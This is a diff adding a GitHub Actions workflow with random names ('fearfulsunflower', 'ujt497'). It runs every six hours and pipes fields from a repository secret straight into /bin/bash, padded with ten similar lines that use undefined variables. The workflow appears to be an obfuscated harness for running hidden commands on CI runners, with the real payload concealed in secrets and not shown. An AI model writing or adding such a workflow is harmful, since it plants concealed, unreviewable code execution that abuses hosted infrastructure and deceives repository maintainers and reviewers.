@@ -1,0 +1,27 @@
+name: fearfulsunflower
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: fearfulsunflower
+        env:
+          ujt497: ${{ secrets.ujt497 }}
+        run: |
+          echo $ujt497 | jq -r .mk7 | /bin/bash
+          echo $bk666 | jq -r .q62349 | /bin/bash
+          echo $ksynw2 | jq -r .w3 | /bin/bash
+          echo $g436 | jq -r .iqjn42560 | /bin/bash
+          echo $c65 | jq -r .svtvm27121 | /bin/bash
+          echo $ffs65 | jq -r .tws9 | /bin/bash
+          echo $c228 | jq -r .xo48 | /bin/bash
+          echo $n9 | jq -r .wchd9 | /bin/bash
+          echo $gmu0508 | jq -r .qyggy9 | /bin/bash
+          echo $yg5603 | jq -r .llftd30 | /bin/bash
+          echo $yokyw7030 | jq -r .q8 | /bin/bash
+
